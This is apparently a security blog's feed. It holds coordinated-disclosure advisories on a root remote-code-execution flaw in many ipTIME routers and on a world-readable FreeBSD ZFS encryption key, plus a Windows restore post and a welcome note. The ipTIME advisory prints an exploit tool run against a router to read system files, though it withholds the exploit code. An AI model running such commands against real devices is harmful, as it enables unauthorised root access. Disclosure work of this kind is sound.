<p><img alt="" src="images/lg-windows-testdisk-004.png" /></p>
<p>The "Windows" partition contains a fully bootable Windows 8.1 system.</p>
<p>The "ICPE" partition is a rescue partition allowing the reinstallation of Windows 8.1 from scratch.</p>
<p>Now confirm the Windows partition as a bootable partition:</p>
<p><img alt="" src="images/lg-windows-testdisk-005.png" /></p>
<p>Reboot now!</p>
<p>The Windows initialization system will ask the user name, the computer name and the default preferred color. After this, you have now a fully working Windows 8.1 system with a "Windows-free" LG laptop. Enjoy!</p>
<p>Hello Windows 8.1:</p>
<p><img alt="" src="images/lg-windows-8.1.png" /></p></content>
    </entry>
    
    <entry>
        <title>ERRATA - 127 ipTIME Routers/WiFi APs/Modems/Firewalls models vulnerable with RCE with root privileges</title>
        <link href="2015-05-05-127-iptime-routers-wifiaps-modems-firewalls-models-vulnerable-with-RCE-with-root-privileges.html"/>
        <content type="html"><p><a href="http://iptime.com/iptime/?uid=16202&amp;mod=document&amp;page_id=16">ipTIME's statement about 112 vulnerable devices</a> seems to be incorrect, so the precedent advisory was incorrect.</p>
<p>By analysis the new firmwares, there are 127 ipTIME vulnerable devices:</p>
<pre><code>ipTIME a1004
ipTIME a1004v
ipTIME a104
ipTIME a104ns
ipTIME a104r
ipTIME a2004
ipTIME a2004ns
ipTIME a2004r
ipTIME a2008
ipTIME a3004
ipTIME a3004ns
ipTIME a5004ns
ipTIME a604
ipTIME a604v
ipTIME extac
ipTIME extd2
ipTIME g1
ipTIME g104
ipTIME g104a
ipTIME g104be
ipTIME g104i
ipTIME g104m
ipTIME g204
ipTIME g501
ipTIME g504
ipTIME ipsmart
ipTIME mini
ipTIME mobap1
ipTIME multi
ipTIME n1
ipTIME n104
ipTIME n104a
ipTIME n104ar1
ipTIME n104i
ipTIME n104k
ipTIME n104ktt
ipTIME n104m
ipTIME n104p
ipTIME n104q
ipTIME n104r
ipTIME n104r3
ipTIME n104rsk
ipTIME n104s
ipTIME n104sr1
ipTIME n104t
ipTIME n104v
ipTIME n104vlg
ipTIME n1e
ipTIME n1eky
ipTIME n1p
ipTIME n2
ipTIME n2e
ipTIME n2p
ipTIME n3004
ipTIME n5
ipTIME n5004
ipTIME n504
ipTIME n5r1
ipTIME n6004
ipTIME n6004m
ipTIME n6004r
ipTIME n604
ipTIME n604a
ipTIME n604i
ipTIME n604m
ipTIME n604p
ipTIME n604r
ipTIME n604s
ipTIME n604t
ipTIME n604v
ipTIME n604vlg
ipTIME n608
ipTIME n7004ns
ipTIME n702bcm
ipTIME n704
ipTIME n704a
ipTIME n704a3
ipTIME n704bcm
ipTIME n704lg
ipTIME n704m
ipTIME n704mlg
ipTIME n704ns
ipTIME n704s
ipTIME n704v
ipTIME n704v3
ipTIME n8004
ipTIME n8004r
ipTIME n8004v
ipTIME n804
ipTIME n804a
ipTIME n804a3
ipTIME n804t
ipTIME n804t3
ipTIME n804v
ipTIME n904
ipTIME n904ns
ipTIME n904v
ipTIME ng104
ipTIME ng304
ipTIME ntq104
ipTIME ntv108
ipTIME ntv116
ipTIME ntv124
ipTIME q1
ipTIME q304
ipTIME q504
ipTIME q604
ipTIME t1004
ipTIME t1008
ipTIME t16000
ipTIME t2008
ipTIME t24000
ipTIME t3004
ipTIME t3008
ipTIME timeve
ipTIME tq204
ipTIME tv104
ipTIME v1016
ipTIME v1024
ipTIME v304
ipTIME v308
ipTIME v504
ipTIME wre1
ipTIME x3003
ipTIME x3007
ipTIME x5007
ipTIME x6003
</code></pre>
<p>You can download firmwares here: <a href="http://download.iptime.com/download/router/">http://download.iptime.com/download/router/</a></p></content>
    </entry>
    
    <entry>
        <title>112 ipTIME Routers/WiFi APs/Modems/Firewalls models vulnerable with RCE with root privileges</title>
        <link href="2015-04-20-112-iptime-routers-wifiaps-modems-firewalls-models-vulnerable-with-RCE-with-root-privileges.html"/>
        <content type="html"><pre><code> -----BEGIN PGP SIGNED MESSAGE-----
 Hash: SHA512

 ## Advisory Information

 Title: 112 ipTIME Routers/WiFi APs/Modems/Firewalls models vulnerable with RCE with root privileges
 Advisory URL: https://pierrekim.github.io/advisories/2015-iptime-0x00.txt.asc
 Date published: 2015-04-17
 Vendors contacted: KrCERT, ipTIME
 Release mode: Released
 CVE: no current CVE



 ## Product Description

 EFMNetworks ipTIME is the largest Korean brand of SOHO/small/middle entreprise Routers/WiFi APs/Modems/Firewalls in South Korea
 with millions of devices deployed in the country. EFMNetworks ipTIME is occupying more than 60 percent of personal network devices.
 There are =~ 10 000 000 of ipTIME devices deployed in South Korea.



 ## Vulnerability Summary

 This vulnerability allows to bypass the admin authentication and to get a direct RCE as root from the LAN side with a single HTTP request.

 This is a direct RCE against the Routers/WiFi APs/Modems/Firewalls which gives a complete root access to the embedded Linux from the LAN side.
 The exploit doesn't work by default from the WAN (no HTTP or UPNP access from the WAN by default unless activated).
 If enabled on the WAN, the remote admin interface exposes the devices to this vulnerability.

 It affects 112 ipTIME products from 2009-era firmwares to the 9.52 firmware (built time 2015-03-23)) with the default configuration:


 - ipTIME A5004NS
 - ipTIME A3004NS
 - ipTIME A3004
 - ipTIME A2004NS
 - ipTIME A2004NSplus
 - ipTIME A2004
 - ipTIME A2004plus
 - ipTIME A2008
 - ipTIME A1004
 - ipTIME A1004V
 - ipTIME A104
 - ipTIME A104NS
 - ipTIME N6004R
 - ipTIME N8004R
 - ipTIME N8004V
 - ipTIME N8004
 - ipTIME N804A3
 - ipTIME N804T3
 - ipTIME N904
 - ipTIME N904plus
 - ipTIME N904V
 - ipTIME N904Vplus
 - ipTIME N704V3
 - ipTIME N704BCM
 - ipTIME N704A3
 - ipTIME N604S
 - ipTIME N604A
 - ipTIME N104S-r1
 - ipTIME Smart
 - ipTIME N904NS
 - ipTIME N704NS
 - ipTIME N604T
 - ipTIME N604Tplus
 - ipTIME N7004NS
 - ipTIME N104V
 - ipTIME N604V
 - ipTIME N604Vplus
 - ipTIME N604R
 - ipTIME N604Rplus
 - ipTIME N604plus
 - ipTIME N104R
 - ipTIME N104Q
 - ipTIME N104plus
 - ipTIME N104K
 - ipTIME N5
 - ipTIME N2plus
 - ipTIME N1plus
 - ipTIME N1E
 - ipTIME N804V
 - ipTIME N804T
 - ipTIME N804A
 - ipTIME N804
 - ipTIME N2E
 - ipTIME N2Eplus
 - ipTIME N104A
 - ipTIME N104S
 - ipTIME N104i
 - ipTIME N1
 - ipTIME N104
 - ipTIME N104M
 - ipTIME N504
 - ipTIME N604i
 - ipTIME N604M
 - ipTIME N608
 - ipTIME N704
 - ipTIME N704A
 - ipTIME N704M
 - ipTIME N704S
 - ipTIME N704V
 - ipTIME N3004
 - ipTIME N5004
 - ipTIME N6004
 - ipTIME N6004M
 - ipTIME N104T
 - ipTIME N5-r1
 - ipTIME N104-r3
 - ipTIME WR-E1
 - ipTIME Mini
 - ipTIME MobileAP1
 - ipTIME Multi
 - ipTIME Extender2
 - ipTIME G1
 - ipTIME G104
 - ipTIME G104BE
 - ipTIME G104M
 - ipTIME G204
 - ipTIME G304
 - ipTIME G504
 - ipTIME G504
 - ipTIME G104i
 - ipTIME G104A
 - ipTIME Q604
 - ipTIME V304
 - ipTIME T3004
 - ipTIME T3008
 - ipTIME T16000
 - ipTIME T24000
 - ipTIME Q1
 - ipTIME Q104
 - ipTIME Q204
 - ipTIME Q304
 - ipTIME Q504
 - ipTIME V104
 - ipTIME V108
 - ipTIME V308
 - ipTIME V116
 - ipTIME V124
 - ipTIME V1024
 - ipTIME V1016
 - ipTIME T1004
 - ipTIME T1008
 - ipTIME X3003
 - ipTIME X3007
 - ipTIME X5007
 - ipTIME X6003


 Concerning the high CVSS score (10/10) of the vulnerability, the number of affected devices and the longevity of this vulnerability (6+ year old), we urge users to apply the new 9.58 firmware.



 ## Details

 The HTTP server allows the attacker to execute some CGI files.

 Many of them are vulnerable to a command inclusion which allows to execute commands with the http daemon user rights (root).


 root@kali:~/iptime# ./iptime.carnage 192.168.0.1 cat /var/run/hwinfo
 company_name=EFM Networks
 product_name=ipTIME N604V
 url=www.iptime.co.kr
 max_vlan=5
 mirror_port=1
 num_lan_port=4
 lan_port_swap=1
 max_port=5
 wan_port=5
 firmup_duration=100
 reboot_duration=40
 max_wds=4
 max_macauth=32
 wireless_ifname=eth0
 wan_ifname=eth2.2
 local_ifname=br0
 br0_port=eth2.1,eth0
 port_diag=1
 flash_diag_dev=/dev/mtd
 bootloader_size=0x10000
 max_firmware_size=0x200000
 save_flash_offset=0x10000
 save_flash_size=0x10000
 flash_sector_size=0x10000
 max_syslog=400
 ip_conntrack_max=8192
 udp_conntrack_max=4096
 icmp_conntrack_max=1024
 auth_server=auth2.efm-net.com
 wan_ifidx=5
 language=kr
 product_alias=n604v
 root@kali:~/iptime# ./iptime.carnage 192.168.0.1 cat /home/http/build_date
 Mon Mar 23 14:54:50 KST 2015
 root@kali:~/iptime#


 Considering the huge potential impact against the South Korea networks, we are not currently planning to release working exploits.



 The exploits will be posted on my blog located at https://pierrekim.github.io/blog/


 ## Vendor Response

 The vendor has released a new firmware version (9.58) for 112 devices:

 http://iptime.com/iptime/?uid=16202&amp;mod=document&amp;page_id=16



 ## Report Timeline

 * Jun 01, 2014: Vulnerability found by Pierre Kim and Alexandre Torres.
 * Mar 24, 2015: Vulnerability confirmed on all the existing versions from 2009 to 2015 including the last firmware version.
 * Apr 07, 2015: KRCERT is notified of the vulnerability using the FIRST dedicated email.
 * Apr 08, 2015: Pierre Kim tries to contact KRCERT using http://eng.krcert.or.kr/contactus/contact.jsp : this form doesn't work (nor &lt;form&gt;, nor JS for form-submission).
 * Apr 08, 2015: Vendor is contacted (security@iptime.com) to provide a valid GPG key.
 * Apr 08, 2015: Email sent to security@iptime.com is bounced.
 * Apr 08, 2015: Vendor is contacted (support@iptime.com) for a GPG key.
 * Apr 09, 2015: KRCERT is contacted (cert@krcert.or.kr - support email) for a GPG key.
 * Apr 09, 2015: vuln@krcert.or.kr is contacted.
 * Apr 09, 2015: KISA is contacted for a GPG key at http://www.kisa.or.kr/eng/contactUs/contactUs.jsp:  400 Bad Request or alert box saying the message was malformed.
 * Apr 09, 2015: KISA is contacted using Twitter (https://twitter.com/PierreKimSec/status/585986016294674433).
 * Apr 09, 2015: FIRST KRCERT answered asking for information about the vulnerabilites and agreed to contact ipTIME to develop a security patch as soon as possible.
 * Apr 09, 2015: 2 POCs are sent to FIRST KRCERT by email.
 * Apr 13, 2015: FIRST KRCERT confirms the POCs work and said they can't assign CVE. They ask a 90 days disclosure policy to allow ipTIME to work on this issue and asks if we can disclose the vulnerabilities details after a patch is released.
 * Apr 13, 2015: MITRE is contacted asking for a CVE number.
 * Apr 13, 2015: FIRST KRCERT is contacted : we agree on the 90 days vulnerability disclosure policy. We ask which models are vulnerable.
 * Apr 14, 2015: vuln@krcert.or.kr replies with one vulnerable model. The vulnerability information is sent to ipTIME and we have to use vuln@krcert.or.kr as a contact address now.
 * Apr 15, 2015: vuln@krcert.or.kr is contacted for a GPG key concerning other vulnerabilities found in ipTIME products.
 * Apr 16, 2015: Vendor releases 112 new firmwares.
 * Apr 16, 2015: vuln@krcert.or.kr is contacted to know if this new firmware fixes the vulnerabilities we reported. The vendor advisory specifies only "User Interface-related security" in Korean (thank you Google Translate).
 * Apr 16, 2015: From our tests, the vulnerabilities have been fixed.
 * Apr 17, 2015: A public advisory is sent to security mailing lists.



 ## Credit

 This vulnerability was found by Alexandre Torres and Pierre Kim (@PierreKimSec).



 ## Greetings

 Big thanks to my friend working at YongSan, specialized in server hardware and alcohol, which gave me for free an ipTIME X3003 which resulted this complete pownage.



 ## References

 http://iptime.com/iptime/?uid=16202&amp;mod=document&amp;page_id=16
 https://pierrekim.github.io/advisories/2015-iptime-0x00.txt.asc



 ## Disclaimer

 This advisory is licensed under a Creative Commons Attribution Non-Commercial
 Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/




 -----BEGIN PGP SIGNATURE-----
 Version: GnuPG v1

 iQIcBAEBCgAGBQJVMHSPAAoJEMQ+Dtp9ky28/5gP/3xaajDhO5Y/u8PkegkGJ4bZ
 63tbiOAh2CiioWzwQXhgPUVqCua8Fh+SFqrrwf1j3klZtiNPR8ThUiQC1efE9q2+
 Q8oc4KMpb0Ysf+HuFBAU7mdqNZazZukAOTttDMSProap72D5QkqzRrWEiYk5Lk/9
 R5/rj94iEZ3ZM3gZkFp1HHSKvkfTXdZdwxv4r2bq3URxqmUnj3aZ/ITmqxLEYEgT
 ufjoaGXodffnNJZNyhFpnIMgK6DZvs8/WdH2+zCKsCltru7ou2biBD1m0LIbYli4
 tCUOzgUQ+FlR7KDmUmBWhtVQodKsWdOSnDJKnyjvLueS1YCGBLMuMiNnbtdmYU8Z
 qdFmAEnSysrxWupk+sPZkcxrzI/8eIbON937JrrCzTaE7jNNgTyhW1AwmDqMDpqe
 pWfPogBRZ1LpUSiOC++zFkkayVMVyhOmqDttrRMhCzW7bCuM9dmPBfBTjqiq6luZ
 HRofLYmG7PBtqCwEJi+AMzWydCJgnOEq2d26AK2BoDK2PuBfGG5Rg47HC82lNOsR
 0mejdpCYJXBw30YjMG5O3cH1PjlG5JfVYXsHmaFTfvN9Omz8xJZBY2528e4gNCOS
 SkyGa4CFJ/QF6N+3kgc5AWpjuvAdtfqINBK2OShNdASGHC+Z4Eyj9J+eaXvu8g7J
 k6tQ5BWKb21foIfsrYyT
 =XTn6
 -----END PGP SIGNATURE-----
</code></pre></content>
    </entry>
    
    <entry>
        <title>CVE-2015-1415</title>
        <link href="2015-04-08-cve-2015-1415.html"/>
        <content type="html"><pre><code>-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

## Advisory Information

Title: FreeBSD 10.x ZFS encryption.key disclosure (CVE-2015-1415)
Advisory URL: https://pierrekim.github.io/advisories/CVE-2015-1415.txt.asc
Date published: 2015-04-07
Vendors contacted: FreeBSD
Release mode: Coordinated release



## Product Description

FreeBSD is a UNIX-like operating system.



## Vulnerability Summary

FreeBSD 10.x installer supports the installation of FreeBSD 10.x  on  an
encrypted ZFS filesystem by default.

When using the encryption system within ZFS during the  installation  of
FreeBSD 10.0 and FreeBSD 10.1, the encryption.key has wrong  permissions
which allow local users to read this file.

Even if the keyfile is passphrase-encrypted, it can present a risk.



## Details

By default, the encryption key file is /boot/encryption.key.

Instead of being 0600, the permissions are 0644:

$ ls -la /boot/encryption.key
- -rw-r--r--  1 root  wheel  4096 Feb 17 15:16 /boot/encryption.key
$

This file is readable by a local user.



## Vendor Response

According to the vendor, a security advisory will be published, describing
the problem and the solution. It concerns:

    - stable/10, 10.1-STABLE
    - releng/10.1, 10.1-RELEASE-p8
    - releng/10.0, 10.0-RELEASE-p18


## Report Timeline

 * Mar 01, 2015: Problem found by Pierre Kim
 * Apr 01, 2015: Vendor is notified of the vulnerability
 * Apr 01, 2015: Vendor confirms report and indicates a fix is  prepared
   but there will be no security advisory format notification because of
   the nature of the problem
 * Apr 02, 2015: Pierre Kim asks a CVE number to the vendor
 * Apr 02, 2015: Vendor indicates to use CVE-2015-1415  and  confirms that a
   signed notification to the mailing lists will be sent.
 * Apr 03, 2015: Pierre Kim contacts FreeBSD about the future notification
 * Apr 04, 2015: Vendor confirms a security advisory will be published
   next week
 * Apr 07, 2015: Vendor publishes a security advisory (FreeBSD-SA-15:08)
 * Apt 07, 2015: This advisory is sent to bugtraq@



## Credit

This vulnerability was found by Pierre Kim (@PierreKimSec).



## References

https://www.freebsd.org/doc/handbook/bsdinstall-partitioning.html
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1415
https://www.freebsd.org/security/advisories/FreeBSD-SA-15:08.bsdinstall.asc



## Disclaimer

This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCAAGBQJVJF22AAoJEMQ+Dtp9ky28NDgP/iW9YALiZKLPVhnShFEhFO4C
SvSza1s7LJkhtOH8qOGplzTrn8wSV5BNhwzMaIaKpksP5RjoCkynxvAw/OncazPl
tsfHM89m7bQ4puyXF3eb6lMkfaIkxoDAXM5R5DFb2Q+3wg4SDygdM7+BQEdqCXDV
2B+ZNGae2CcsqLq04zjskFgY2bwqNMyX3GbbmUJvVI5IXQIS30e1lVIq8zxcK7u0
lKFlVyp+gdyusenPz0lCqR82Pe1IA3tHuNn2zw3/EudT4VhD789/t/0lEWlSyNg7
uiTCqFpQXnpEnvXEez1gZiDuNccIMXXYv0agB+/mYkkoviQPk5jqCwI5rvs+ppFU
IH0gAafqS/UIl5+/dhDdIVDA4+r4WWLUxJfFkDy4ThCQHZtZMCsBYk3/RNJBPDUW
JiVZWV8LSSHtYfWj7YoiCswuC9FLp6CT9e+/XQUJjpNrwfpeT5KlFOCFUKQXwV6W
5nUJnQhjVfrXVjeRuOvMCInSwG8DWbfyX75QMmJNyV7aPMrS2prRXbOlTLuQUyzP
cJkmToeO4XE4COV+jvtC+c39Booy3r8yp3lfHmz1NXffiv6Ua+11vLamUeYOVPew
r4TmionPpSeAx3ODhKEKGjW+HIkl9sx3WcSnEBl88Aqd3Zv77G3ok4usFz4PvPnb
/hnH/lhpePtv13jyZpXc
=pOPH
-----END PGP SIGNATURE-----
</code></pre></content>
    </entry>
    
    <entry>
        <title>Annyeong haseyo!</title>
        <link href="2015-04-07-annyeong-haseyo.html"/>
        <content type="html"><p>Annyeong haseyo!</p>
<p>I will use this blog to post fun things about IT security and kimchi.</p></content>
    </entry>
    
</feed>